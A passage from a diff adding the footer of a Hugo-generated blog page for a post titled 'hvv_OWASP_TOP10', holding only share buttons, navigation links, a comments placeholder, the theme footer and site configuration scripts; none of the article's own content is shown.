+            <div class="post-info-share"><button title="Share on Twitter" data-sharer="twitter" data-url="http://scofield1920.github.io/hvv_owasptop10/" data-title="hvv_OWASP_TOP10" data-hashtags="hvv,web"><span class="fab fa-twitter fa-fw"></span></button><button title="Share on Facebook" data-sharer="facebook" data-url="http://scofield1920.github.io/hvv_owasptop10/" data-hashtag="hvv"><span class="fab fa-facebook-square fa-fw"></span></button><button title="Share on Hacker News" data-sharer="hackernews" data-url="http://scofield1920.github.io/hvv_owasptop10/" data-title="hvv_OWASP_TOP10"><span class="fab fa-hacker-news fa-fw"></span></button><button title="Share on Line" data-sharer="line" data-url="http://scofield1920.github.io/hvv_owasptop10/" data-title="hvv_OWASP_TOP10"><span data-svg-src="/lib/simple-icons/icons/line.min.svg"></span></button><button title="Share on 微博" data-sharer="weibo" data-url="http://scofield1920.github.io/hvv_owasptop10/" data-title="hvv_OWASP_TOP10"><span class="fab fa-weibo fa-fw"></span></button><button title="Share on Telegram" data-sharer="telegram" data-url="http://scofield1920.github.io/hvv_owasptop10/" data-title="hvv_OWASP_TOP10" data-web><span class="fab fa-telegram-plane fa-fw"></span></button><script>
+        function shareOnMastodon(title, link) {
+            const SHARE_MASTODON_DOMAIN = "share_mastodon_domain"
+            const savedDomain = localStorage.getItem(SHARE_MASTODON_DOMAIN) ?? "mastodon.social";
+            const domain = prompt("Enter your Mastodon domain", savedDomain);
+            if (domain === null) {
+                return;
+            }
+            localStorage.setItem(SHARE_MASTODON_DOMAIN, domain)
+            const text = title + "\n\n" + link;
+            const url = new URL("https://" + domain)
+            url.pathname = "share"
+            url.searchParams.append('text', text)
+            window.open(url, '_blank', "width=500,height=500,left=500,toolbar=0,status=0");
+        }
+    </script>
+    <button title="Share on Mastodon"onclick="javascript:shareOnMastodon(&#34;hvv_OWASP_TOP10&#34;, &#34;http://scofield1920.github.io/hvv_owasptop10/&#34;)"><span class="fab fa-mastodon fa-fw"></span></button></div>
+        </div>
+    </div>
+
+    <div class="post-info-more">
+        <section class="post-tags"><i class="fas fa-tags fa-fw"></i>&nbsp;<a href="/tags/hvv/">hvv</a>,&nbsp;<a href="/tags/web/">web</a></section>
+        <section>
+            <span><a href="javascript:void(0);" onclick="window.history.back();">Back</a></span>&nbsp;|&nbsp;<span><a href="/">Home</a></span>
+        </section>
+    </div>
+
+    <div class="post-nav"><a href="/hvv_middleware_bug/" class="prev" rel="prev" title="hvv_中间件漏洞"><i class="fas fa-angle-left fa-fw"></i>hvv_中间件漏洞</a>
+            <a href="/hvv_java/" class="next" rel="next" title="hvv_Java">hvv_Java<i class="fas fa-angle-right fa-fw"></i></a></div>
+</div>
+<div id="comments"><div id="utterances"></div><noscript>
+                Please enable JavaScript to view the comments powered by <a href="https://utteranc.es/">Utterances</a>.
+            </noscript></div></article></div>
+        </main><footer class="footer">
+        <div class="footer-container"><div class="footer-line">
+                    Powered by <a href="https://gohugo.io/" target="_blank" rel="noopener noreferrer" title="Hugo 0.120.4">Hugo</a>&nbsp;|&nbsp;Theme - <a href="https://github.com/HEIGE-PCloud/DoIt" target="_blank" rel="noopener noreferrer" title="DoIt 0.4.0"><i class="far fa-edit fa-fw"></i> DoIt</a>
+                </div><div class="footer-line"><i class="far fa-copyright fa-fw"></i><span itemprop="copyrightYear">2019 - 2023</span><span class="author" itemprop="copyrightHolder">&nbsp;<a href="/" target="_blank" rel="noopener noreferrer"></a></span>&nbsp;|&nbsp;<span class="license"><a rel="license external nofollow noopener noreffer" href="https://creativecommons.org/licenses/by-nc/4.0/" target="_blank">CC BY-NC 4.0</a></span></div>
+            <div class="footer-line"></div>
+            <div class="footer-line">
+            </div>
+        </div></footer></div>
+
+    <div id="fixed-buttons"><a href="#back-to-top" id="back-to-top-button" class="fixed-button" title="Back to Top">
+            <i class="fas fa-arrow-up fa-fw"></i>
+        </a><a href="#" id="view-comments" class="fixed-button" title="View Comments">
+            <i class="fas fa-comment fa-fw"></i>
+        </a>
+    </div><div class="assets"><script type="text/javascript">window.config={"code":{"copyTitle":"Copy to clipboard","maxShownLines":10},"comment":{"utterances":{"darkTheme":"github-dark","issueTerm":"pathname","label":"","lightTheme":"github-light","repo":"Hugo-DoIt/utterances-comments"}},"data":{"desktop-header-typeit":"Scfie1d-Blog","mobile-header-typeit":"Scfie1d-Blog"},"search":{"algoliaAppID":"5YGRNRQK1G","algoliaIndex":"en_index","algoliaSearchKey":"0ff6874805de24b84aa1d5ebccad56cd","highlightTag":"em","maxResultLength":10,"noResultsFound":"No results found","snippetLength":300,"type":"algolia"},"sharerjs":true,"table":{"sort":true},"typeit":{"cursorChar":"|","cursorSpeed":1000,"data":{"desktop-header-typeit":["desktop-header-typeit"],"mobile-header-typeit":["mobile-header-typeit"]},"duration":-1,"speed":100}};</script><script type="text/javascript" src="/lib/tablesort/tablesort.min.js"></script><script type="text/javascript" src="/lib/clipboard/clipboard.min.js"></script><script type="text/javascript" src="/lib/sharer/sharer.min.js"></script><script type="text/javascript" src="/lib/typeit/typeit.min.js"></script><script type="text/javascript" src="/js/theme.min.js" defer></script><script type="text/javascript" src="/js/utterances.min.js" defer></script></div>
+</body>
+
+</html>
